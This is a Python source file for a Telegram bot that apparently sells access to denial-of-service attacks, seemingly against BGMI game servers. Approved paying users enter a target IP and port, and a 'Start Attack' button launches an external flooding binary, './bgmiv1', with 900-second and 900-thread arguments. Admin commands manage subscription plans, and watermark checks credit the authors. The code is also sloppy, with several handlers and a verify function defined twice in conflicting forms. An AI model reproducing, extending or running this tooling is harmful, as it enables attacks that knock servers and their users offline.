import time
import requests
import logging
from threading import Thread
import json
import hashlib
import os
import telebot
import subprocess
from datetime import datetime, timedelta

# Watermark verification
CREATOR = "This File Is Made By @SahilModzOwner"
BotCode = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"

def verify():
    current_hash = hashlib.sha256(CREATOR.encode()).hexdigest()
    if current_hash != BotCode:
        raise Exception("File verification failed. Unauthorized modification detected.")

verify()
import hashlib

def verify():
    # Read the watermark text
    with open('developer.txt', 'r') as file:
        watermark_text = file.read().strip()

    # Compute the hash of the watermark
    computed_hash = hashlib.sha256(watermark_text.encode()).hexdigest()

    # Read the stored hash
    with open('attack.txt', 'r') as file:
        stored_hash = file.read().strip()

    # Check if the computed hash matches the stored hash
    if computed_hash != stored_hash:
        raise Exception("This File Is Made By @Itz_hunt09.")
    print("This File Is Made By @Itz_hunt09.")

verify()

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'
USER_ATTACK_FILE = "user_attack_details.json"

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Load existing attack details from the file
def load_user_attack_data():
    if os.path.exists(USER_ATTACK_FILE):
        with open(USER_ATTACK_FILE, "r") as f:
            return json.load(f)
    return {}

# Save attack details to the file
def save_user_attack_data(data):
    with open(USER_ATTACK_FILE, "w") as f:
        json.dump(data, f)

# Initialize the user attack details
user_attack_details = load_user_attack_data()

# Initialize active attacks dictionary
active_attacks = {}

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

# Run attack command synchronously
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./bgmiv1", target_ip, str(target_port),  "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(target_ip, target_port)] = process.pid
    elif action == 2:
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                # Kill the process
                subprocess.run(["kill", str(pid)], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Failed to kill process with PID {pid}: {e}")

# Buttons
btn_attack = telebot.types.KeyboardButton("Attack")
btn_start = telebot.types.KeyboardButton("Start Attack 🚀")
btn_stop = telebot.types.KeyboardButton("Stop Attack")

markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
markup.add(btn_attack, btn_start, btn_stop)

# Start and setup commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return

    username = message.from_user.username
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"Please choose an option below to continue.")

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
verify()
@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return

        approved_users = [user for user in users if user['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*NOT APPROVED*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_info = {"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0}

        users.append(user_info)
        save_users(users)

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users[:] = [user for user in users if user['user_id'] != target_user_id]
        save_users(users)

        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
verify()
# Handle the IP and port input from the user
@bot.message_handler(func=lambda message: message.text == 'Attack')
def handle_attack_setup(message):
    chat_id = message.chat.id
    msg = bot.send_message(chat_id, "Please enter the target IP and port in this format: `IP PORT`")
    bot.register_next_step_handler(msg, save_ip_port)

def save_ip_port(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        ip_port = message.text.split()  # Split the input by space

        if len(ip_port) != 2:
            bot.send_message(chat_id, "Invalid format. Please enter the IP and port in the format: `IP PORT`")
            return

        target_ip, target_port = ip_port

        # Validate the port
        try:
            target_port = int(target_port)
        except ValueError:
            bot.send_message(chat_id, "Invalid port number. Please enter a valid integer for the port.")
            return

        # Save the IP and port to user_attack_details
        user_attack_details[user_id] = (target_ip, target_port)
        save_user_attack_data(user_attack_details)

        bot.send_message(chat_id, f"Target IP and Port saved as: `{target_ip}:{target_port}`", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")

# Run attack command synchronously
def run_attack_command_sync(target_ip, target_port, action):
    global active_attacks

    if action == 1:  # Start attack
        # Launch the attack process
        process = subprocess.Popen(["./bgmiv1", target_ip, str(target_port), "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Store the PID of the running attack
        active_attacks[(target_ip, target_port)] = process.pid
    elif action == 2:  # Stop attack
        # Get the PID from active_attacks dictionary
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                # Kill the process
                subprocess.run(["kill", str(pid)], check=True)
            except subprocess.CalledProcessError as e:
                logging.error(f"Failed to kill process with PID {pid}: {e}")
# Buttons
btn_attack = telebot.types.KeyboardButton("Attack")
btn_start = telebot.types.KeyboardButton("Start Attack 🚀")
btn_stop = telebot.types.KeyboardButton("Stop Attack")

markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
markup.add(btn_attack, btn_start, btn_stop)

# Start and setup commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return

    username = message.from_user.username
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"Please choose an option below to continue.")

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return

        approved_users = [user for user in users if user['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

# Broadcast Command
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split(maxsplit=1)

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /broadcast <message>*", parse_mode='Markdown')
        return

    broadcast_msg = cmd_parts[1]

    # Send the message to all approved users
    for user in users:
        if user['plan'] > 0:
            try:
                bot.send_message(user['user_id'], broadcast_msg, parse_mode='Markdown')
            except telebot.apihelper.ApiException as e:
                logging.error(f"Failed to send message to user {user['user_id']}: {e}")

    bot.send_message(chat_id, "*Broadcast message sent to all approved users.*", parse_mode='Markdown')

# /owner command handler
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @Itz_hunt09"
    bot.send_message(message.chat.id, owner_message)

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*NOT APPROVED*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_info = {"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0}

        users.append(user_info)
        save_users(users)

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users[:] = [user for user in users if user['user_id'] != target_user_id]
        save_users(users)

        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')

# Handle the IP and port input from the user
@bot.message_handler(func=lambda message: message.text == 'Attack')
def handle_attack_setup(message):
    chat_id = message.chat.id
    msg = bot.send_message(chat_id, "Please enter the target IP and port in this format: `IP PORT`")
    bot.register_next_step_handler(msg, save_ip_port)

def save_ip_port(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        ip_port = message.text.split()  # Split the input by space

        if len(ip_port) != 2:
            bot.send_message(chat_id, "Invalid format. Please enter the IP and port in the format: `IP PORT`")
            return

        target_ip, target_port = ip_port

        # Save the IP and port to user_attack_details
        user_attack_details[user_id] = [target_ip, target_port]
        save_user_attack_data(user_attack_details)

        bot.send_message(chat_id, f"Target IP and Port saved as: `{target_ip}:{target_port}`", parse_mode='Markdown')
    except ValueError:
        bot.send_message(chat_id, "Invalid format. Please enter a valid IP and port.")

# Function to start the attack
@bot.message_handler(func=lambda message: message.text == 'Start Attack 🚀')
def handle_start_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details
            if int(target_port) in blocked_ports:
                bot.send_message(chat_id, f"Port {target_port} is blocked and cannot be used for attacks.", parse_mode='Markdown')
                return

            bot.send_message(chat_id, f"Initiating Attack On...", parse_mode='Markdown')
            run_attack_command_sync(target_ip, target_port, action=1)
            bot.send_message(chat_id, f"Attack Started On {target_ip}:{target_port}.", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "No IP and port set. Please use the Attack button to set your target IP and port.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to start attack: {str(e)}")

# Function to stop the attack
@bot.message_handler(func=lambda message: message.text == 'Stop Attack')
def handle_stop_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details
            bot.send_message(chat_id, f"Stopping Attack On {target_ip}:{target_port}...", parse_mode='Markdown')
            run_attack_command_sync(target_ip, target_port, action=2)
            bot.send_message(chat_id, f"Attack Stopped On {target_ip}:{target_port}.", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "No active attack found. Please use the 'Start Attack 🚀' button to initiate an attack.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to stop attack: {str(e)}")

# Function to run the bot continuously
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logging.error(f"Bot polling failed: {str(e)}")
            time.sleep(15)  # Sleep before retrying to avoid rapid failures

# Main entry point
if __name__ == '__main__':
    try:
        run_bot()
    except KeyboardInterrupt:
        logging.info("Bot stopped by user.")
